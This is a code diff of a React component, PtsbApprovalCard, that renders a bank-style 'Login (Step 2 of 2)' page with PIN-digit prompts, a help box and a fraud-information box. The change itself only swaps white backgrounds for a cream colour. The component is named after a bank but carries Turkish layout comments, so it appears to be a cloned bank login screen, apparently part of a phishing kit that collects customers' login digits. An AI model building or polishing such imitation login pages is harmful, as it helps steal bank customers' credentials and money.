@@ -51,7 +51,7 @@ export function PtsbApprovalCard({ digitLabels, saving, onSubmit }: Props) {
 
       <main className="mx-auto w-full max-w-[1100px] px-3 py-4 sm:px-6 sm:py-8">
         {/* LOGIN MODULE */}
-        <div className="mx-auto w-full max-w-[720px] rounded-sm bg-white px-4 py-8 text-center shadow-[0_4px_20px_rgba(0,0,0,0.35)] sm:px-10 sm:py-10">
+        <div className="mx-auto w-full max-w-[720px] rounded-sm bg-[#fff6ec] px-4 py-8 text-center shadow-[0_4px_20px_rgba(0,0,0,0.35)] sm:px-10 sm:py-10">
           <h1 className="mb-6 text-[26px] font-bold leading-tight text-[#1D252C] sm:mb-8 sm:text-[32px]">
             Login <span className="font-normal">(Step 2 of 2)</span>
           </h1>
@@ -99,7 +99,7 @@ export function PtsbApprovalCard({ digitLabels, saving, onSubmit }: Props) {
 
         {/* ALT MODULLER — desktop 2 kolon, mobil alt alta */}
         <div className="mx-auto mt-4 grid w-full max-w-[720px] grid-cols-1 gap-4 sm:mt-6 sm:grid-cols-2">
-          <div className="rounded-sm bg-white px-5 py-5 text-left shadow-[0_4px_20px_rgba(0,0,0,0.35)]">
+          <div className="rounded-sm bg-[#fff6ec] px-5 py-5 text-left shadow-[0_4px_20px_rgba(0,0,0,0.35)]">
             <h3 className="mb-3 text-[16px] font-bold text-[#1D252C]">Need help?</h3>
             <p className="mb-3 text-[13px] leading-relaxed text-[#4a545c]">
               There's no need to be stuck. If you need some assistance, why not pop over to
@@ -118,7 +118,7 @@ export function PtsbApprovalCard({ digitLabels, saving, onSubmit }: Props) {
             </p>
           </div>
 
-          <div className="rounded-sm bg-white px-5 py-5 text-left shadow-[0_4px_20px_rgba(0,0,0,0.35)]">
+          <div className="rounded-sm bg-[#fff6ec] px-5 py-5 text-left shadow-[0_4px_20px_rgba(0,0,0,0.35)]">
             <h3 className="mb-3 text-[16px] font-bold text-[#1D252C]">
               Important Fraud Information
             </h3>
